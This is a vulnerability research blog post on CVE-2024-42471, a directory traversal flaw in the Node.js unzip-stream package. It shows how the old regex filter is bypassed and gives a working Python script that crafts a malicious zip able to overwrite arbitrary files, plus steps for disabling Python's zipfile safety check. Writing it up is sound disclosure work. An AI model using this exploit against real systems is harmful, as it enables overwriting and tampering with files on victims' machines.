---
title: CVE-2024-42471 - unzip-stream Vulnerability Ananlysis and PoC
date: 2025-04-18 09:00:00 +0800
categories: [Vulnerability Research, Exploit Development]
tags: [arbitrary file write, file overwrite, link following]
math: true
mermaid: true
media_subpath: /assets/posts/2025-04-18-unzip-stream-PoC
image:
  path: preview.png
---

# Vulnerability anaylsis and PoC Development for CVE-2024-42471

## Introduction
Zip it, unzip it — and boom, you've got unintended file writes on your hands.

In this post, we dive into a directory traversal vulnerability in the popular Node.js package [`unzip-stream`](https://www.npmjs.com/package/unzip-stream), specifically affecting versions **before 0.3.2**. When using the `Extract()` method to decompress zip files, a specially crafted archive can escape the intended extraction directory and **write files to arbitrary locations** on the file system.

In this blog post, we’ll break down the bug and walk through a working proof-of-concept (PoC).

## Vulnerability Analysis
After developing an exploit for [CVE-2024-12905](https://github.com/advisories/GHSA-pq67-2wwv-3xjx), I became curious about other file write or overwrite vulnerabilities that lacked a public proof-of-concept (PoC). During that exploration, I came across [CVE-2024-42471](https://github.com/advisories/GHSA-6jrj-vc65-c983).

Once again, I decided to roll up my sleeves and develop an exploit for this vulnerability. In this post, I’ll walk you through the process, from vulnerability analysis to crafting a working PoC that demonstrates the risks involved.

I started off by looking at the [commit](https://github.com/mhr3/unzip-stream/commit/ab67989719abb4dcc774d02de266151905b8d45a) that fixed the vulnerability and basically the patch diff.

In *Figure 1* we can see the commit and that line `291` was deleted and replaced. 
![GitHub commit](github_patch_diff.png)

Firstly, the `entry.path` object in `unzip-stream` determines the path of the file within the zip archive, and this path is then used by `unzip-stream` to decide where to extract the file on the target system.

The original code (highlighted in red) relied on a regular expression to detect and remove directory traversal sequences. However, this approach was limited and prone to bypasses. To address this, the code was updated with a newer implementation (shown in green), which aims to handle the directory traversal issue more effectively.


To better understand how this regex behaves, we can use [Regexr](https://regexr.com/) to test various payloads.

For instance, when testing the classic directory traversal pattern `../`, we immediately get a match:

![Testing Raw Directory Traversal](testing_with_regexr.png)
*Figure 1: Testing the regex filter*

Upon further examination of the regex, I realized that it only matches strings that begin with the `../` pattern. This creates an opportunity for bypassing the filter by using alternative traversal strings, such as `hack/../../../`, which the regex does not catch.

This bypass technique is demonstrated in *Figure 2*.

![Bypassing Regex](bypassing_regex_on_regexr.png)
*Figure 2: Bypassing the regex filter*

As shown, this approach successfully bypasses the regex and allows for directory traversal, exposing the limitations of the old filtering mechanism.

This implies that an attacker can craft a zip file containing file paths with directory traversal strings. By doing so, they can manipulate the extraction process to point to files located outside the intended extraction directory, potentially overwriting sensitive files or causing other unintended behavior.

## Exploit Development
I developed a working exploit using Python. The core idea is to modify the path of the file within the zip archive to include directory traversal sequences before packaging it. This tricks the vulnerable `unzip-stream` extractor into writing files outside of the intended directory.

```python
import zipfile
import os

file_path = './poc'
zip_name = 'evil.zip'
path_to_overwrite_file = 'home/mcsam/pocc'

if not os.path.isfile(file_path):
    print(f"Error: File '{file_path}' does not exist.")
    return

with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipf.write(file_path, \
    arcname=f'hack/../../../../../../../../../../../../../../{path_to_overwrite_file}')
    print(f"File '{file_path}' has been zipped as '{zip_name}'.")
```

There’s an important issue we need to address. The built-in Python `zipfile` library enforces a restriction that prevents  `arcnames` starting with alphanumeric characters from containing directory traversal sequences like `../`. FYI arcname is the name that will be used for the file within the archive.

Because of this limitation, I had to manually patch the `zipfile.py` module to disable the validation check that enforces this behavior. This allowed me to create zip entries with traversal paths necessary for the exploit to work.

On my system the path to the file was: `/usr/lib/python3.10/zipfile.py`. I commented out the check and the i run the exploit to craft the malicious zip file.
![Patching Zipfile for python3](patching_zipfile_python3.png)

The contents of the zip file should look like this after running the exploit:
```
mcsam@0x32:~/Documents/slippy$ unzip -l evil.zip 
Archive:  evil.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       15  2025-04-18 18:35   hack/../../../../../../../../../../../../../../home/mcsam/pocc
---------                     -------
       15                     1 file
```

## ✅ Verifying / Testing the Exploit

To test this PoC, we first set up a development environment and install the vulnerable version of `unzip-stream` using:

```
npm install unzip-stream@0.3.1
```

Next, I crafted a simple test script (`index.js`) that imports `unzip-stream` and extracts the malicious archive:
```
const unzip = require('unzip-stream');
const fs = require('fs');

fs.createReadStream('evil.zip').pipe(unzip.Extract({ path: './hack' }));
```

After executing the script with:
```
node index.js
```
the payload is triggered, and the file `/home/msam/pocc` is successfully overwritten — confirming the exploit works as intended.

#### Verifying the exploit
![Final file overwrite](successfull_file_overwrite.png)

## References
- [https://github.com/advisories/GHSA-6jrj-vc65-c983](https://github.com/advisories/GHSA-6jrj-vc65-c983)
- [https://github.com/mhr3/unzip-stream/commit/ab67989719abb4dcc774d02de266151905b8d45a](https://github.com/mhr3/unzip-stream/commit/ab67989719abb4dcc774d02de266151905b8d45a)
- [https://www.npmjs.com/package/unzip-stream](https://www.npmjs.com/package/unzip-stream)